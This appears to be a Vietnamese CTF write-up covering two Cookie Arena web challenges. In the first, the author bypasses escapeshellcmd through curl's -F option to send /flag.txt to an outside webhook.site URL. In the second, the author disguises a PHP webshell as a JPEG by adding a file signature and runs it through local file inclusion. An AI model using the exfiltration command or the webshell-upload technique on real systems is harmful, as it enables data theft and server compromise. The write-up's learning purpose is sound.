# CTF_cookie-Arena
Challenges CTF cookie arena with me


##**1 Baby Crawler**

Writeup đầu tiên trong CTF_cookie-Arena này là challenge Baby Crawler với mình thì bài này không quá khó nhưng cũng làm tốn kha khá thời gian của mình và bắt đầu nào :>>
truy cập vào đường dẫn thử thách ta có giao diện chính của web như hình:
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/d3d6f79f-c20e-45de-8dba-c1e09b40ad04)
với nút CRAWL và 1 đường link đến https://vnexpress.net/viet-nam-xuat-khau-sang-my-latinh-mot-ty-usd-moi-thang-4541275.html khi bấm nút CRAWL web sẽ hiển thị 1 đường dẫn Cached File:
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/30ae0633-365c-4d7a-84cf-a44bf2f39971)
truy cập vào thì nó sẽ dẫn ta đến trang chưa nội dung của bài báo. Sau khi tìm hiểu chức năng cũng như cách hoạt động của web mình thử view-source xem có kiếm được source code hoặc đường dẫn ẩn nào không thì đập vào mắt mình là /?debug
![Screenshot 2024-06-12 000915](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/2764819a-475b-4c8e-9deb-520bf6969fcb) 
sau khi truy cập ?debug thì mình đã có được source của bài này (phần source mình có để ở Baby Crawler các bạn có thể xem)

Sau khi đọc source code thì mình đã chú ý đến đoạn sau

![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/13979d67-2497-46a2-b74e-03602dd6c598)

Có thê thấy trong code biến $url là untrusted data được đưa vào 1 hàm nguy hiểm như shell_exec xử lý. Đến đây việc còn lại là khai thác lỗi  Command Injection và làm sao để khai thác nó. Để thao túng được biến url ta phải dảm bảo 2 điều kiện 
1 là bắt đầu là http do strpos sẽ kiễm tra chuỗi nhập có bắt đầu là http không 
2 là được filter bởi hàm **escapeshellcmd** thì trong PHP escapeshellcmd sẽ thoát khỏi các kí tự (& # ; `| * ? ~ < > ^ ( ) [ ] { } $ \ , \ x0A and \xFF . ' và ")

Nhận thấy curl được nối chuỗi với phần escapeshellcmd($url) mình đã thử nhiều cách nhưng vẫn không thu được kêt quả gì do vướng escapeshellcmd . Bỏ qua hướng tiếp cận bằng && ; thì mình thử tìm hiểu coi curl có thể làm được gì thì mình đã tìm ra được curl có cho phép mình gửi nội dung của file tới một server ngoài bằng -F (ex: curl -F "file=@/path/to/example.txt" https://api.example.com/upload). Tìm ra hướng đi mình bắt đầu thử nghiệm nó và server ngoài mình chọn để dùng là webhook.site và thực hiện input sau: https://webhook.site/1560d9e5-0482-4a96-b3d0-d1583a783b90 -F "file=@/flag.txt"
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/f7f80235-6165-4d2b-911d-8740724ab665) và ngay lập tức webhook mình nhận được gói tin
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/5c815677-e450-42f5-89b2-a6818746e1e0) lúc này mình chỉ cần download file chứa flag là xong


##**2 Baby File Inclusion**

bài thứ 2 trong CTF_cookie-Arena này là challenge Baby File Inclusion chỉ cần nhìn tên cũng đoán được thử này có lỗ hổng file inclusion đây là 1 trong nhưng lỗ hổng đầu tiên mà mình học bắt đầu nào !!!!
Yêu cầu của thử thách này là làm sao tạo ra được webshell để đọc được file flagxxx.txt trong hệ thống và đây là giao diện của lab gồm button cho mình tìm và tải file từ máy lên và 1 button để upload nó lên 
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/1960da91-d9cf-4b65-8f9a-2ba2b014c243)
mình thử uploads 1 file hình ảnh lên thì mình có được 1 đường dẫn là uploads/download.jpg để xem hình ảnh
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/c3e1bdc5-16f0-4031-8dc8-ef18497cff15)

Tiếp theo mình thử upload 1 file có tên test.txt thì nhận lại thông báo "Sorry, the file extension 'txt' is not allowed"

![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/22bfad3e-6ddd-45ca-a5ed-c19aa8e38266)

từ đó mình có thể đoán ra nó chỉ cho phép gửi file có đuôi là jpg hoặc png . Mình liền thử gửi lại nó qua burp-suite giữ lại đuôi file là .jpg thay đổi Content-Type sang image/jpeg nhưng sửa lại nội dung là phpinfo(); để xem có được không thì ăn ngay cái thông báo "Sorry, this content type is not allowed"
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/2b017c26-f459-46b3-a112-fd16ad26e276)

hum.... cho các bạn chưa biết thì trong PHP Các loại file khác nhau sẽ được xác định bằng một vài byte đầu tiên của file, gọi là file signature. Nó sẽ đọc các byte đầu tiên của tệp và so sánh chúng với cơ sở dữ liệu chữ ký để xác định loại MIME của tệp nếu khớp thì nó sẽ coi như file đó hợp lệ !!!!!
Có được kiến thức này thì bài lab này sẽ chỉ là 1 cái bánh chờ ta ăn thôi hahaha 
Việc cần làm lúc này là mình chỉ cần google tìm file signature của jpg copy nó vào trước webshell và uploads nó lên thôi (^.^)
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/f40b2ce1-f6a9-4829-a7e1-0eefad759e5b)
Ở đây mình tận dụng lại request lúc đầu xóa phần nội dung chỉ giữ lại cái file signature và chèn webshell "phpinfo()" để test thì đã thấy file haha.jpg được tải lên thành công giờ vào thử uploads/haha.jpg để xem web có chạy shell mà mình up lên không nhé
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/ac339ebc-5658-4b49-936c-7704cb439e31)
kết quả không như mình tính toán nhỉ sau 1 lúc thì mình có để ý đuôi của URL của web có đoạn index.php?page=upload.php vậy nếu mình đổi upload.php sang uploads/haha.jpg thì sao ???
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/16081811-b5be-4fae-9a74-0c419c48e34b)
Vậy là thành công rồi việc bây giờ là đổi shell để đọc được file flagxxx.txt (à mỗi lần up shell nhớ đổi tên file nha tại web sẽ không nhận file nhận lại file đã có ) và đây là cách mình làm
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/16bf265b-b4b7-4dd5-a1ec-703b8e5ec217)
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/ad0d9eff-3445-472a-9b92-b14994e3d9c1)
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/682f5f4e-f597-4f2e-97de-866d89d9670c)
![image](https://github.com/tthanhnguyen/CTF_cookie-Arena/assets/96458810/dc223cf1-c094-41d3-84ab-222f55609eec)











